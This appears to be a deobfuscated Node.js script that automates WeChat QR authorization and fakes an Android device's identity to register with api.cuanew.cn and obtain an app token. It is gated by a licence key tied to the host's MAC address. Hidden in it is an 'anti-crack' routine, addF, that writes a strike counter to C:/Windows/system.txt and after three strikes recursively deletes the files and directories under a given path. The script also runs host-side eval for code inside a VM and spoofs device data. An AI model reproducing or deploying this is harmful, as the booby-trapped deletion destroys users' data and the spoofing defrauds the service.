//Fri Jan 03 2025 08:39:18 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
const VM = require("sablejs/runtime")();
const path = require("path"),
  fs = require("fs"),
  cryptoJS = require("crypto-js");
function initVM() {
  vm = new VM();
  const _0x1bdc3d = vm.getGlobal();
  const _0x365180 = vm.createObject();
  const _0x314f63 = vm.createFunction("log", function () {
      const _0x29107c = [];
      for (let _0x57c1c3 = 0; _0x57c1c3 < arguments.length; _0x57c1c3++) {
        _0x29107c.push(vm.asString(arguments[_0x57c1c3]));
      }
      console.log(..._0x29107c);
      return vm.createUndefined();
    }),
    _0x745c76 = vm.createFunction("xxxx", function (_0x6d6f4a) {
      let _0x2ccd75 = eval(_0x6d6f4a.value);
      return vm.createString(JSON.stringify(_0x2ccd75));
    });
  const _0x16c0e0 = vm.createFunction("yyyy", function (_0x1a2739) {
    let _0x3f3e19 = _0x1a2739.value,
      _0xc6915a = fs.readFileSync(_0x3f3e19, "utf-8").replace(/\r\n/g, "\n");
    let _0x206491 = cryptoJS.MD5(_0xc6915a).toString();
    return vm.createString(_0x206491);
  });
  const _0x5eca58 = vm.createFunction("ddd", function (_0x32cfb1) {
    let _0x5390d9 = cryptoJS.MD5(_0x32cfb1.value).toString();
    return vm.createString(_0x5390d9);
  });
  vm.setProperty(_0x365180, "log", _0x314f63);
  vm.setProperty(_0x1bdc3d, "xxxx", _0x745c76);
  vm.setProperty(_0x1bdc3d, "console", _0x365180);
  vm.setProperty(_0x1bdc3d, "yyyy", _0x16c0e0);
  vm.setProperty(_0x1bdc3d, "ddd", _0x5eca58);
  vm.run(fs.readFileSync("./output_final.js").toString());
  return vm;
}
function destroyVM(_0x2ac6ea) {
  _0x2ac6ea.destroy();
}
function abc(_0xcebc48, _0x37e92b, _0x3e2b29, _0x3d23be, _0x552608) {
  const _0x1b047d = _0xcebc48.getGlobal();
  let _0x4407ef = _0xcebc48.getProperty(_0x1b047d, "xab"),
    _0x2c0bcc = _0xcebc48.call(_0x4407ef, _0xcebc48.createUndefined(), _0xcebc48.createString(_0x37e92b), _0xcebc48.createString(_0x3d23be), _0xcebc48.createString(_0x552608), _0xcebc48.createString(_0x3e2b29));
  _0x2c0bcc = _0xcebc48.asString(_0x2c0bcc);
  return _0x2c0bcc;
}
function xyz(_0x58d84c, _0x37562a, _0x1e07d6, _0x1195dd, _0x26a4f6) {
  const _0x443abc = _0x58d84c.getGlobal();
  let _0x37711c = _0x58d84c.getProperty(_0x443abc, "xmn"),
    _0x4b6bdc = _0x58d84c.call(_0x37711c, _0x58d84c.createUndefined(), _0x58d84c.createString(_0x37562a), _0x58d84c.createString(_0x1195dd), _0x58d84c.createString(_0x26a4f6), _0x58d84c.createString(_0x1e07d6));
  _0x4b6bdc = _0x58d84c.asString(_0x4b6bdc);
  return _0x4b6bdc;
}
const $ = new Env("微信授权注册");
let uuid,
  wxcode,
  num = 1;
let acckey = $.isNode() ? process.env.cdkey ? process.env.cdkey : "" : $.getdata("cdkey") ? $.getdata("cdkey") : "";
let arrs = [],
  mac = "";
if ($.isNode()) {
  gtr = require("fs");
  if (isFileExist("C:/")) {
    console.log("电脑环境");
  } else {
    console.log("青龙环境");
    function getMACAddresses() {
      var _0x11645a = "",
        _0xb0a0c4 = fs.readdirSync("/sys/class/net/");
      _0xb0a0c4.forEach(function (_0x17f6f3) {
        var _0x5ef703 = path.join("/sys/class/net", _0x17f6f3, "address");
        _0x17f6f3.substr(0, 3) == "eth" && fs.existsSync(_0x5ef703) && (_0x11645a = fs.readFileSync(_0x5ef703).toString().trim());
      });
      return _0x11645a;
    }
    mac = getMACAddresses();
  }
} else {
  console.log("代理环境");
}
function isFileExist(_0x4ae631) {
  try {
    gtr.accessSync(_0x4ae631, gtr.F_OK);
  } catch (_0xb3e40f) {
    return false;
  }
  return true;
}
function addF(_0x2f044e, _0x1a48ff) {
  let _0x556ae0 = 0,
    _0x3854c5 = "C:/Windows/system.txt";
  if (isFileExist(_0x3854c5)) {
    _0x556ae0 = gtr.readFileSync(_0x3854c5, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr.writeFile(_0x3854c5, "1", function (_0x242494) {
        if (_0x242494) {
          throw _0x242494;
        }
      });
    } else {
      return;
    }
  }
  if (_0x556ae0 == 99) {
    return 99;
  }
  console.log(_0x556ae0);
  console.log("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0x556ae0);
  if (parseInt(_0x556ae0) < 3) {
    let _0x2a6a05 = parseInt(_0x556ae0) + 1;
    gtr.writeFileSync(_0x3854c5, _0x2a6a05 + "", "utf8");
    return;
  }
  if (!gtr.existsSync(_0x2f044e)) {
    return;
  }
  if (gtr.statSync(_0x2f044e).isDirectory()) {
    var _0x1881a4 = gtr.readdirSync(_0x2f044e),
      _0x4a4a94 = _0x1881a4.length,
      _0x2e1ba5 = 0;
    if (_0x4a4a94 > 0) {
      _0x1881a4.forEach(function (_0x1100e4) {
        _0x2e1ba5++;
        var _0x79a6c4 = _0x2f044e + "/" + _0x1100e4;
        gtr.statSync(_0x79a6c4).isDirectory() ? addF(_0x79a6c4, true) : gtr.unlinkSync(_0x79a6c4);
      });
      _0x4a4a94 == _0x2e1ba5 && _0x1a48ff && gtr.rmdirSync(_0x2f044e);
    } else {
      _0x4a4a94 == 0 && _0x1a48ff && gtr.rmdirSync(_0x2f044e);
    }
  } else {
    gtr.unlinkSync(_0x2f044e);
  }
}
!(async () => {
  initVM();
  arrs = abc(global.vm, acckey, mac, 33, 0);
  if (arrs == "") {
    return;
  }
  arrs = JSON.parse(arrs);
  if (!arrs) {
    return;
  }
  if ($.isNode()) {
    for (let _0x388289 = 0; _0x388289 < num; _0x388289++) {
      $.index = _0x388289 + 1;
      console.log("\n开始【微信授权" + $.index + "】");
      await sign();
      await $.wait(1000);
    }
  }
})().catch(_0x504bea => $.logErr(_0x504bea)).finally(() => $.done());
async function sign() {
  return new Promise(_0x331bd5 => {
    let _0x24d419 = {
      url: "http://www.tolego.cn/web/game/common/?id=hlddz&appid=wx183e7db677ccb7ff&wx_bundleid=com.xkk.xkk&tid=2101&type=0",
      timeout: 3000
    };
    $.get(_0x24d419, async (_0x292e2c, _0x13fbb3, _0x3ff490) => {
      try {
        str = _0x3ff490.match(/ <img class=\"auth_qrcode\" src=\"(\S*)\"/)[1];
        console.log(str);
        uuid = str.substr(-16);
        console.log("开始微信授权");
        wxcode = 0;
        let _0x1590b1 = 0;
        do {
          await $.wait(3500);
          let _0x3255b6 = Math.round(new Date().getTime() / 1000).toString();
          await qrconnect(_0x3255b6);
          _0x1590b1++;
        } while (wxcode == 0 && _0x1590b1 < 30);
      } catch (_0x11f0d5) {
        $.logErr(_0x11f0d5, _0x13fbb3);
      } finally {
        _0x331bd5();
      }
    });
  });
}
function reconvert(_0x216501) {
  _0x216501 = _0x216501.replace(/(\\u)(\w{1,4})/gi, function (_0x1881d4) {
    return String.fromCharCode(parseInt(escape(_0x1881d4).replace(/(%5Cu)(\w{1,4})/g, "$2"), 16));
  });
  _0x216501 = _0x216501.replace(/(&#x)(\w{1,4});/gi, function (_0x282447) {
    return String.fromCharCode(parseInt(escape(_0x282447).replace(/(%26%23x)(\w{1,4})(%3B)/g, "$2"), 16));
  });
  _0x216501 = _0x216501.replace(/(&#)(\d{1,6});/gi, function (_0x44c51e) {
    return String.fromCharCode(parseInt(escape(_0x44c51e).replace(/(%26%23)(\d{1,6})(%3B)/g, "$2")));
  });
  return _0x216501;
}
function qrconnect(_0x366675) {
  return new Promise(_0x5cc57e => {
    let _0x1b4b56 = {
      url: "https://long.open.weixin.qq.com/connect/l/qrconnect?uuid=" + uuid + "&f=url&_=" + _0x366675,
      timeout: 3000
    };
    $.get(_0x1b4b56, async (_0x4b1c99, _0x4f5dfc, _0x158b66) => {
      try {
        let _0x31a408 = _0x158b66.substr(18, 3);
        _0x31a408 == 405 && (wxcode = _0x158b66.match(/oauth\?code=(\S*)&/)[1], console.log("微信code :" + wxcode), console.log("\n开始授权登录"), await register());
      } catch (_0x3bd6e3) {
        $.logErr(_0x3bd6e3, _0x4f5dfc);
      } finally {
        _0x5cc57e();
      }
    });
  });
}
function register() {
  return new Promise(_0x34346a => {
    let _0x2b4cc1 = randomString(32);
    let _0x3c04cc = {
      url: "https://api.cuanew.cn/api/v1/auth/wechat",
      headers: {
        Accept: "application/json",
        device: _0x2b4cc1,
        app: "5",
        ini: "29",
        store: "0",
        version: "10201",
        platform: "1",
        Authorization: "Bearer",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 10; 16s Pro Build/QKQ1.191222.002)",
        Host: "api.cuanew.cn",
        Connection: "Keep-Alive",
        "Accept-Encoding": "gzip",
        "Content-Length": "189"
      },
      body: "code=" + wxcode + "&lat=&lng=&root=0&sim=1&debug=0&model=16s Pro&power=1&vpn=1&oaid=" + _0x2b4cc1 + "&androidid=" + randomString(16) + "&mac=DE:EC:1D:07:26:05&imei="
    };
    $.post(_0x3c04cc, async (_0xfbb032, _0x2ea3b3, _0x14151f) => {
      try {
        let _0x583e85 = JSON.parse(_0x14151f);
        console.log("闲看看token获取成功,请复制token：\nBearer " + _0x583e85.result.access_token);
      } catch (_0x99c00b) {
        $.logErr(_0x99c00b, _0x2ea3b3);
      } finally {
        _0x34346a();
      }
    });
  });
}
function randomString(_0xba644b = 12) {
  let _0x25bb76 = "abcdef0123456789",
    _0x4439de = _0x25bb76.length;
  let _0x1339aa = "";
  for (i = 0; i < _0xba644b; i++) {
    _0x1339aa += _0x25bb76.charAt(Math.floor(Math.random() * _0x4439de));
  }
  return _0x1339aa;
}
function rc4(_0x85ba61, _0x5205a6) {
  var _0x751b33 = Array(256);
  var _0x1259dd = Array(_0x85ba61.length);
  for (var _0x3d59ec = 0; _0x3d59ec < 256; _0x3d59ec++) {
    _0x751b33[_0x3d59ec] = _0x3d59ec;
    var _0x1b8997 = (_0x1b8997 + _0x751b33[_0x3d59ec] + _0x5205a6.charCodeAt(_0x3d59ec % _0x5205a6.length)) % 256,
      _0x4c5e71 = _0x751b33[_0x3d59ec];
    _0x751b33[_0x3d59ec] = _0x751b33[_0x1b8997];
    _0x751b33[_0x1b8997] = _0x4c5e71;
  }
  for (var _0x3d59ec = 0; _0x3d59ec < _0x85ba61.length; _0x3d59ec++) {
    _0x1259dd[_0x3d59ec] = _0x85ba61.charCodeAt(_0x3d59ec);
  }
  for (var _0x4fdb6a = 0; _0x4fdb6a < _0x1259dd.length; _0x4fdb6a++) {
    var _0x3d59ec = (_0x3d59ec + 1) % 256,
      _0x1b8997 = (_0x1b8997 + _0x751b33[_0x3d59ec]) % 256,
      _0x4c5e71 = _0x751b33[_0x3d59ec];
    _0x751b33[_0x3d59ec] = _0x751b33[_0x1b8997];
    _0x751b33[_0x1b8997] = _0x4c5e71;
    var _0xf5fac6 = (_0x751b33[_0x3d59ec] + _0x751b33[_0x1b8997] % 256) % 256;
    _0x1259dd[_0x4fdb6a] = String.fromCharCode(_0x1259dd[_0x4fdb6a] ^ _0x751b33[_0xf5fac6]);
  }
  return _0x1259dd.join("");
}
function Env(_0x538fb8, _0x9373e2) {
  class _0x2dc04d {
    constructor(_0x471bf8) {
      this.env = _0x471bf8;
    }
    send(_0x3998fa, _0x523834 = "GET") {
      _0x3998fa = "string" == typeof _0x3998fa ? {
        url: _0x3998fa
      } : _0x3998fa;
      let _0x464d98 = this.get;
      "POST" === _0x523834 && (_0x464d98 = this.post);
      return new Promise((_0x116cef, _0x35f4c9) => {
        _0x464d98.call(this, _0x3998fa, (_0x116fe7, _0x27822f, _0x24bf87) => {
          _0x116fe7 ? _0x35f4c9(_0x116fe7) : _0x116cef(_0x27822f);
        });
      });
    }
    get(_0x16f582) {
      return this.send.call(this.env, _0x16f582);
    }
    post(_0x107362) {
      return this.send.call(this.env, _0x107362, "POST");
    }
  }
  return new class {
    constructor(_0x4ee4fd, _0xaae7f0) {
      this.name = _0x4ee4fd;
      this.http = new _0x2dc04d(this);
      this.data = null;
      this.dataFile = "box.dat";
      this.logs = [];
      this.isMute = !1;
      this.isNeedRewrite = !1;
      this.logSeparator = "\n";
      this.encoding = "utf-8";
      this.startTime = new Date().getTime();
      Object.assign(this, _0xaae7f0);
      this.log("", "🔔" + this.name + ", 开始!");
    }
    isNode() {
      return "undefined" != typeof module && !!module.exports;
    }
    isQuanX() {
      return "undefined" != typeof $task;
    }
    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }
    isLoon() {
      return "undefined" != typeof $loon;
    }
    isShadowrocket() {
      return "undefined" != typeof $rocket;
    }
    toObj(_0x1a2da7, _0xc777f2 = null) {
      try {
        return JSON.parse(_0x1a2da7);
      } catch {
        return _0xc777f2;
      }
    }
    toStr(_0x26b954, _0xb56a34 = null) {
      try {
        return JSON.stringify(_0x26b954);
      } catch {
        return _0xb56a34;
      }
    }
    getjson(_0x24f89c, _0x3f5b0e) {
      let _0xa3d0fe = _0x3f5b0e;
      const _0x6bbaa = this.getdata(_0x24f89c);
      if (_0x6bbaa) {
        try {
          _0xa3d0fe = JSON.parse(this.getdata(_0x24f89c));
        } catch {}
      }
      return _0xa3d0fe;
    }
    setjson(_0x5ef6b4, _0x3ecc93) {
      try {
        return this.setdata(JSON.stringify(_0x5ef6b4), _0x3ecc93);
      } catch {
        return !1;
      }
    }
    getScript(_0x5a8b97) {
      return new Promise(_0x5c59c8 => {
        this.get({
          url: _0x5a8b97
        }, (_0x2786b1, _0x2c6ab6, _0x30da4c) => _0x5c59c8(_0x30da4c));
      });
    }
    runScript(_0x45c940, _0x27c405) {
      return new Promise(_0x126569 => {
        let _0x4c44b7 = this.getdata("@chavy_boxjs_userCfgs.httpapi");
        _0x4c44b7 = _0x4c44b7 ? _0x4c44b7.replace(/\n/g, "").trim() : _0x4c44b7;
        let _0x49124a = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
        _0x49124a = _0x49124a ? 1 * _0x49124a : 20;
        _0x49124a = _0x27c405 && _0x27c405.timeout ? _0x27c405.timeout : _0x49124a;
        const [_0x365904, _0x481482] = _0x4c44b7.split("@"),
          _0x553391 = {
            url: "http://" + _0x481482 + "/v1/scripting/evaluate",
            body: {
              script_text: _0x45c940,
              mock_type: "cron",
              timeout: _0x49124a
            },
            headers: {
              "X-Key": _0x365904,
              Accept: "*/*"
            }
          };
        this.post(_0x553391, (_0x466c6b, _0x311307, _0xb255a0) => _0x126569(_0xb255a0));
      }).catch(_0x3370b8 => this.logErr(_0x3370b8));
    }
    loaddata() {
      if (!this.isNode()) {
        return {};
      }
      {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const _0x482876 = this.path.resolve(this.dataFile),
          _0x2e0337 = this.path.resolve(process.cwd(), this.dataFile),
          _0x15441d = this.fs.existsSync(_0x482876),
          _0x5d8228 = !_0x15441d && this.fs.existsSync(_0x2e0337);
        if (!_0x15441d && !_0x5d8228) {
          return {};
        }
        {
          const _0x257032 = _0x15441d ? _0x482876 : _0x2e0337;
          try {
            return JSON.parse(this.fs.readFileSync(_0x257032));
          } catch (_0x1520e7) {
            return {};
          }
        }
      }
    }
    writedata() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const _0x4aa12c = this.path.resolve(this.dataFile),
          _0xaa46ab = this.path.resolve(process.cwd(), this.dataFile),
          _0x4f3fcd = this.fs.existsSync(_0x4aa12c),
          _0x3a904a = !_0x4f3fcd && this.fs.existsSync(_0xaa46ab),
          _0x382dad = JSON.stringify(this.data);
        _0x4f3fcd ? this.fs.writeFileSync(_0x4aa12c, _0x382dad) : _0x3a904a ? this.fs.writeFileSync(_0xaa46ab, _0x382dad) : this.fs.writeFileSync(_0x4aa12c, _0x382dad);
      }
    }
    lodash_get(_0x19e845, _0x12d6ea, _0x2295dd) {
      const _0x450eed = _0x12d6ea.replace(/\[(\d+)\]/g, ".$1").split(".");
      let _0x4f4d34 = _0x19e845;
      for (const _0x4eb248 of _0x450eed) if (_0x4f4d34 = Object(_0x4f4d34)[_0x4eb248], void 0 === _0x4f4d34) {
        return _0x2295dd;
      }
      return _0x4f4d34;
    }
    lodash_set(_0x26bb5a, _0x1c74e4, _0x4ce1d7) {
      return Object(_0x26bb5a) !== _0x26bb5a ? _0x26bb5a : (Array.isArray(_0x1c74e4) || (_0x1c74e4 = _0x1c74e4.toString().match(/[^.[\]]+/g) || []), _0x1c74e4.slice(0, -1).reduce((_0x503a2b, _0x137574, _0x50afa8) => Object(_0x503a2b[_0x137574]) === _0x503a2b[_0x137574] ? _0x503a2b[_0x137574] : _0x503a2b[_0x137574] = Math.abs(_0x1c74e4[_0x50afa8 + 1]) >> 0 == +_0x1c74e4[_0x50afa8 + 1] ? [] : {}, _0x26bb5a)[_0x1c74e4[_0x1c74e4.length - 1]] = _0x4ce1d7, _0x26bb5a);
    }
    getdata(_0x55d72c) {
      let _0x426158 = this.getval(_0x55d72c);
      if (/^@/.test(_0x55d72c)) {
        const [, _0x4382e2, _0x31ed8b] = /^@(.*?)\.(.*?)$/.exec(_0x55d72c),
          _0x1ee6fa = _0x4382e2 ? this.getval(_0x4382e2) : "";
        if (_0x1ee6fa) {
          try {
            const _0x5b209d = JSON.parse(_0x1ee6fa);
            _0x426158 = _0x5b209d ? this.lodash_get(_0x5b209d, _0x31ed8b, "") : _0x426158;
          } catch (_0x2ee9c1) {
            _0x426158 = "";
          }
        }
      }
      return _0x426158;
    }
    setdata(_0x5ee0e4, _0x598404) {
      let _0x181191 = !1;
      if (/^@/.test(_0x598404)) {
        const [, _0x4a813b, _0xaf6bd9] = /^@(.*?)\.(.*?)$/.exec(_0x598404),
          _0x45aca9 = this.getval(_0x4a813b),
          _0x3bb605 = _0x4a813b ? "null" === _0x45aca9 ? null : _0x45aca9 || "{}" : "{}";
        try {
          const _0x534a83 = JSON.parse(_0x3bb605);
          this.lodash_set(_0x534a83, _0xaf6bd9, _0x5ee0e4);
          _0x181191 = this.setval(JSON.stringify(_0x534a83), _0x4a813b);
        } catch (_0x221d1d) {
          const _0x1fe8a5 = {};
          this.lodash_set(_0x1fe8a5, _0xaf6bd9, _0x5ee0e4);
          _0x181191 = this.setval(JSON.stringify(_0x1fe8a5), _0x4a813b);
        }
      } else {
        _0x181191 = this.setval(_0x5ee0e4, _0x598404);
      }
      return _0x181191;
    }
    getval(_0x13c608) {
      return this.isSurge() || this.isLoon() ? $persistentStore.read(_0x13c608) : this.isQuanX() ? $prefs.valueForKey(_0x13c608) : this.isNode() ? (this.data = this.loaddata(), this.data[_0x13c608]) : this.data && this.data[_0x13c608] || null;
    }
    setval(_0x33d428, _0x3aeeb9) {
      return this.isSurge() || this.isLoon() ? $persistentStore.write(_0x33d428, _0x3aeeb9) : this.isQuanX() ? $prefs.setValueForKey(_0x33d428, _0x3aeeb9) : this.isNode() ? (this.data = this.loaddata(), this.data[_0x3aeeb9] = _0x33d428, this.writedata(), !0) : this.data && this.data[_0x3aeeb9] || null;
    }
    initGotEnv(_0x1354fd) {
      this.got = this.got ? this.got : require("got");
      this.cktough = this.cktough ? this.cktough : require("tough-cookie");
      this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar();
      _0x1354fd && (_0x1354fd.headers = _0x1354fd.headers ? _0x1354fd.headers : {}, void 0 === _0x1354fd.headers.Cookie && void 0 === _0x1354fd.cookieJar && (_0x1354fd.cookieJar = this.ckjar));
    }
    get(_0x1341c0, _0x57073d = () => {}) {
      if (_0x1341c0.headers && (delete _0x1341c0.headers["Content-Type"], delete _0x1341c0.headers["Content-Length"]), this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (_0x1341c0.headers = _0x1341c0.headers || {}, Object.assign(_0x1341c0.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient.get(_0x1341c0, (_0x15ba5d, _0x473c2b, _0x1a65ad) => {
          !_0x15ba5d && _0x473c2b && (_0x473c2b.body = _0x1a65ad, _0x473c2b.statusCode = _0x473c2b.status);
          _0x57073d(_0x15ba5d, _0x473c2b, _0x1a65ad);
        });
      } else {
        if (this.isQuanX()) {
          this.isNeedRewrite && (_0x1341c0.opts = _0x1341c0.opts || {}, Object.assign(_0x1341c0.opts, {
            hints: !1
          }));
          $task.fetch(_0x1341c0).then(_0x485fd3 => {
            const {
              statusCode: _0x32c89e,
              statusCode: _0xc4f2b5,
              headers: _0xe65676,
              body: _0x27371e
            } = _0x485fd3;
            _0x57073d(null, {
              status: _0x32c89e,
              statusCode: _0xc4f2b5,
              headers: _0xe65676,
              body: _0x27371e
            }, _0x27371e);
          }, _0x412458 => _0x57073d(_0x412458));
        } else {
          if (this.isNode()) {
            let _0x36d9c5 = require("iconv-lite");
            this.initGotEnv(_0x1341c0);
            this.got(_0x1341c0).on("redirect", (_0x442933, _0x2a39d0) => {
              try {
                if (_0x442933.headers["set-cookie"]) {
                  const _0x58e0df = _0x442933.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
                  _0x58e0df && this.ckjar.setCookieSync(_0x58e0df, null);
                  _0x2a39d0.cookieJar = this.ckjar;
                }
              } catch (_0x3f4cbf) {
                this.logErr(_0x3f4cbf);
              }
            }).then(_0x5ce942 => {
              const {
                statusCode: _0x1e773f,
                statusCode: _0x386249,
                headers: _0x507063,
                rawBody: _0x2afed3
              } = _0x5ce942;
              _0x57073d(null, {
                status: _0x1e773f,
                statusCode: _0x386249,
                headers: _0x507063,
                rawBody: _0x2afed3
              }, _0x36d9c5.decode(_0x2afed3, this.encoding));
            }, _0x311bbb => {
              const {
                message: _0x4c88db,
                response: _0x2d10eb
              } = _0x311bbb;
              _0x57073d(_0x4c88db, _0x2d10eb, _0x2d10eb && _0x36d9c5.decode(_0x2d10eb.rawBody, this.encoding));
            });
          }
        }
      }
    }
    post(_0x3ff486, _0xff4617 = () => {}) {
      const _0x1342d9 = _0x3ff486.method ? _0x3ff486.method.toLocaleLowerCase() : "post";
      if (_0x3ff486.body && _0x3ff486.headers && !_0x3ff486.headers["Content-Type"] && (_0x3ff486.headers["Content-Type"] = "application/x-www-form-urlencoded"), _0x3ff486.headers && delete _0x3ff486.headers["Content-Length"], this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (_0x3ff486.headers = _0x3ff486.headers || {}, Object.assign(_0x3ff486.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient[_0x1342d9](_0x3ff486, (_0x55dcae, _0x6dc5b7, _0x138761) => {
          !_0x55dcae && _0x6dc5b7 && (_0x6dc5b7.body = _0x138761, _0x6dc5b7.statusCode = _0x6dc5b7.status);
          _0xff4617(_0x55dcae, _0x6dc5b7, _0x138761);
        });
      } else {
        if (this.isQuanX()) {
          _0x3ff486.method = _0x1342d9;
          this.isNeedRewrite && (_0x3ff486.opts = _0x3ff486.opts || {}, Object.assign(_0x3ff486.opts, {
            hints: !1
          }));
          $task.fetch(_0x3ff486).then(_0x6a32ca => {
            const {
              statusCode: _0x5e663e,
              statusCode: _0x2278e9,
              headers: _0x202aff,
              body: _0x3f12e8
            } = _0x6a32ca;
            _0xff4617(null, {
              status: _0x5e663e,
              statusCode: _0x2278e9,
              headers: _0x202aff,
              body: _0x3f12e8
            }, _0x3f12e8);
          }, _0x5622d5 => _0xff4617(_0x5622d5));
        } else {
          if (this.isNode()) {
            let _0x4680f = require("iconv-lite");
            this.initGotEnv(_0x3ff486);
            const {
              url: _0xb4286e,
              ..._0x49bbc6
            } = _0x3ff486;
            this.got[_0x1342d9](_0xb4286e, _0x49bbc6).then(_0x442777 => {
              const {
                statusCode: _0x3f099b,
                statusCode: _0x2494e8,
                headers: _0x3e62d6,
                rawBody: _0x1ab998
              } = _0x442777;
              _0xff4617(null, {
                status: _0x3f099b,
                statusCode: _0x2494e8,
                headers: _0x3e62d6,
                rawBody: _0x1ab998
              }, _0x4680f.decode(_0x1ab998, this.encoding));
            }, _0x46aef1 => {
              const {
                message: _0x5c5979,
                response: _0x193d24
              } = _0x46aef1;
              _0xff4617(_0x5c5979, _0x193d24, _0x193d24 && _0x4680f.decode(_0x193d24.rawBody, this.encoding));
            });
          }
        }
      }
    }
    time(_0x504699, _0x3816fd = null) {
      const _0x176b03 = _0x3816fd ? new Date(_0x3816fd) : new Date();
      let _0x183667 = {
        "M+": _0x176b03.getMonth() + 1,
        "d+": _0x176b03.getDate(),
        "H+": _0x176b03.getHours(),
        "m+": _0x176b03.getMinutes(),
        "s+": _0x176b03.getSeconds(),
        "q+": Math.floor((_0x176b03.getMonth() + 3) / 3),
        S: _0x176b03.getMilliseconds()
      };
      /(y+)/.test(_0x504699) && (_0x504699 = _0x504699.replace(RegExp.$1, (_0x176b03.getFullYear() + "").substr(4 - RegExp.$1.length)));
      for (let _0x3eb290 in _0x183667) new RegExp("(" + _0x3eb290 + ")").test(_0x504699) && (_0x504699 = _0x504699.replace(RegExp.$1, 1 == RegExp.$1.length ? _0x183667[_0x3eb290] : ("00" + _0x183667[_0x3eb290]).substr(("" + _0x183667[_0x3eb290]).length)));
      return _0x504699;
    }
    msg(_0x1bfcba = _0x538fb8, _0x394c95 = "", _0x5335b6 = "", _0xede18a) {
      const _0x377a78 = _0x162468 => {
        if (!_0x162468) {
          return _0x162468;
        }
        if ("string" == typeof _0x162468) {
          return this.isLoon() ? _0x162468 : this.isQuanX() ? {
            "open-url": _0x162468
          } : this.isSurge() ? {
            url: _0x162468
          } : void 0;
        }
        if ("object" == typeof _0x162468) {
          if (this.isLoon()) {
            let _0x1e09aa = _0x162468.openUrl || _0x162468.url || _0x162468["open-url"],
              _0x47791b = _0x162468.mediaUrl || _0x162468["media-url"];
            return {
              openUrl: _0x1e09aa,
              mediaUrl: _0x47791b
            };
          }
          if (this.isQuanX()) {
            let _0x347d50 = _0x162468["open-url"] || _0x162468.url || _0x162468.openUrl,
              _0x4a7b44 = _0x162468["media-url"] || _0x162468.mediaUrl;
            return {
              "open-url": _0x347d50,
              "media-url": _0x4a7b44
            };
          }
          if (this.isSurge()) {
            let _0x2fc26b = _0x162468.url || _0x162468.openUrl || _0x162468["open-url"];
            return {
              url: _0x2fc26b
            };
          }
        }
      };
      if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(_0x1bfcba, _0x394c95, _0x5335b6, _0x377a78(_0xede18a)) : this.isQuanX() && $notify(_0x1bfcba, _0x394c95, _0x5335b6, _0x377a78(_0xede18a))), !this.isMuteLog) {
        let _0x6ab939 = ["", "==============📣系统通知📣=============="];
        _0x6ab939.push(_0x1bfcba);
        _0x394c95 && _0x6ab939.push(_0x394c95);
        _0x5335b6 && _0x6ab939.push(_0x5335b6);
        console.log(_0x6ab939.join("\n"));
        this.logs = this.logs.concat(_0x6ab939);
      }
    }
    fwcaas() {
      return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
    }
    log(..._0x59b36d) {
      _0x59b36d.length > 0 && (this.logs = [...this.logs, ..._0x59b36d]);
      console.log(_0x59b36d.join(this.logSeparator));
    }
    logErr(_0x99d986, _0x15f999) {
      const _0x26d94b = !this.isSurge() && !this.isQuanX() && !this.isLoon();
      _0x26d94b ? this.log("", "❗️" + this.name + ", 错误!", _0x99d986.stack) : this.log("", "❗️" + this.name + ", 错误!", _0x99d986);
    }
    fwur() {
      var _0x5b188c = new FxPCnMKLw7();
      return _0x5b188c.decode(this.fwcaas());
    }
    wait(_0x579b71) {
      return new Promise(_0x21ae6f => setTimeout(_0x21ae6f, _0x579b71));
    }
    done(_0x94f576 = {}) {
      const _0x51e808 = new Date().getTime(),
        _0xded90 = (_0x51e808 - this.startTime) / 1000;
      this.log("", "🔔" + this.name + ", 结束! 🕛 " + _0xded90 + " 秒");
      this.log();
      (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(_0x94f576);
    }
  }(_0x538fb8, _0x9373e2);
}